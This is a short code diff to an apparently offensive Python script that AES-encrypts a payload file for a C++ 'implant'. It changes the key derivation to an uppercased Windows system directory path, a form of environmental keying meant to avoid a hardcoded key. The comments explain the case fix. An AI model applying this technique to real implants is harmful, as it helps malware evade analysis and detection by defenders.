@@ -22,17 +22,21 @@ try:
     file = open(sys.argv[1], "rb")
     content = file.read()
 except:
-    print("Usage: .\AES_cryptor.py PAYLOAD_FILE")
+    print("Usage: .\\aes.py PAYLOAD_FILE")
     sys.exit()
 
 
 #KEY = urandom(16)
-KEY = b'C:\WINDOWS\syste'
+KEY = b'C:\WINDOWS\SYSTE'
 
-# GetSystemDirectoryA() => C:\WINDOWS\system32 (19-3) => C:\WINDOWS\syste (=16 byte key)  => Environmental Keying without Intial Recon Needed (No Hardcoding of passwd)!
+# GetSystemDirectoryA() => C:\WINDOWS\SYSTEM32 (19-3) => C:\WINDOWS\syste (=16 byte key)  => Environmental Keying without Intial Recon Needed (No Hardcoding of passwd)!
+
+# I saw that: 
+# 1. In My windows Host: my cpp implant is retrieving: "C:\WINDOWS\system32" via GetSystemDirectoryA()
+# 2. But in my Windows VM: my cpp implant is retrieving: "C:\Windows\system32" via GetSystemDirectoryA()
+
+# That's why changed the whole string to Upper case, after retrieving!
 
 ciphertext, key = AESencrypt(content, KEY)
 
 dropFile(KEY,ciphertext)
-
-
